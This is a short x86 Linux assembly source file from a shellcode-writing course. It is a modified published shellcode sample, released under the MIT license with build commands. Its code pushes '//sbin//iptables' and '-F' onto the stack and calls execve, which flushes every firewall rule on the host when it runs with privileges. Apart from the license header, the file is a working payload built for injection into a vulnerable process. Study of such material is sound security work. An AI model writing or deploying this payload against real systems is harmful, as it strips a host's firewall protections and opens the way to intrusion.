; Modified version of shellcode-65
; This was created as part of the SecurityTube Linux Assembly Expert
; course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;
; Travis Mathison
;
; The MIT License (MIT)
; 
; Copyright (c) 2018 Travis Mathison
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;
; BUILD:
; nasm -f elf32 ./shellcode-65-modified.nasm -o shellcode-65-modified.o
; ld ./shellcode-65-modified.o -o shellcode-65-modified
section .text
    global _start

_start:
    ; execve("//sbin//iptables", { "//sbin//iptables", "-F", NULL }, NULL)
    xor eax,eax
    push eax
    push 0x73656c62
    push 0x61747069
    push 0x2f2f6e69
    push 0x62732f2f
    mov ebx,esp 	; "//sbin//iptables\0"
    push eax
    push word 0x462d    ; 
    mov ecx, esp        ; "-F\0"
    push eax
    push ecx            ; push ecx (-F)
    push ebx
    mov ecx,esp
    mov al, 0xa
    inc ax
    int 0x80            ; #define __NR_execve 11

